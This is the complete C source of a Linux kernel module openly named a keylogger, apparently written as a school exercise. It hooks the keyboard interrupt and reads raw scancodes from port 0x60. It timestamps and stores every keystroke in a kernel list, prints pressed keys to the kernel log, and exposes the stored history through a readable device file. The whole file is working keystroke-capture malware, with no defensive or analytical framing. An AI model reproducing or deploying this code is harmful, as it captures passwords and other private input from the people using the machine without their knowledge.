#include "stroke.h"

static LIST_HEAD(strokehead);

/*
 * This variable is used as an identifier for shared interrupt lines.
 * Since many drivers can be loaded on the same line, free_irq needs
 * to know what driver it should free.
 * I set it to the address of strokehead, is it a good idea ?
*/
static void *line_id = &strokehead;

static void irq_keylogger(unsigned long data);

DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);

static struct file_operations misc_fops = {
	.owner = THIS_MODULE,
	.open = my_open,
	.read = seq_read
};

static struct miscdevice misc_s = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger42",
	.fops = &misc_fops
};

static int keylogger_show(struct seq_file *seq, void *v)
{
	struct stroke_s *cur;

	list_for_each_entry(cur, &strokehead, list)
	{
		seq_printf(seq, "Key = %d, Name = %s\n", cur->key, keytable[cur->key].name);
	}
	return 0;
}

int my_open(struct inode *inode, struct file *file)
{
	return single_open(file, keylogger_show, NULL);
}
/*
ssize_t my_read(struct file *f, char __user *buf, size_t size, loff_t *pos)
{
	
	return 0;
}
*/
static void get_time(struct tm *time)
{
	struct timeval tv;

	do_gettimeofday(&tv);

	/*
	 * time_to_tm converts calendar time to tm struct.
	 * totalsecs is calibrated on UTC, so we add 1 hour to
	 * offset to get GMT+1
	*/
	time_to_tm(tv.tv_sec, 3600, time);
}

static void irq_keylogger(unsigned long data)
{
	int scancode = inb(0x60);
	struct stroke_s *keystroke;

	keystroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
	if (!keystroke)
		return ;
	keystroke->state = scancode & 0x80;
	keystroke->key = scancode & ~0x80;
	get_time(&keystroke->time);
//	printk("KEY = %d\n", keystroke->key);

	if (keystroke->key < keytable_len && keystroke->state)
		printk("KEY = %d, NAME = %s\n", \
			keystroke->key, \
			keytable[keystroke->key].name);
	
	list_add_tail(&keystroke->list, &strokehead);
}

static irqreturn_t irq_handler(int irq, void *dev_id)
{
	tasklet_schedule(&tasklet_s);
	return IRQ_HANDLED;
}

static int __init init_keyboard(void)
{
	int ret;

	ret = request_irq(1,			\
			irq_handler,		\
			IRQF_SHARED,		\
			"keylogger42",	\
			line_id);
	if (ret)
		return ret;
	pr_info("LOADED -- 42 keylogger module.\n");
	return misc_register(&misc_s);
}

static void free_list(void)
{
	struct stroke_s *cur;
	struct stroke_s *tmp;

	list_for_each_entry_safe(cur, tmp, &strokehead, list)
	{
		kfree(cur);
	}
}

static void __exit exit_keyboard(void)
{
	free_list();
	free_irq(1, line_id);
	tasklet_kill(&tasklet_s);
	pr_info("UNLOADED -- 42 keylogger module.\n");
	misc_deregister(&misc_s);
}

module_init(init_keyboard);
module_exit(exit_keyboard);

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("agouby");
MODULE_DESCRIPTION("Keyboard driver, keylogger");
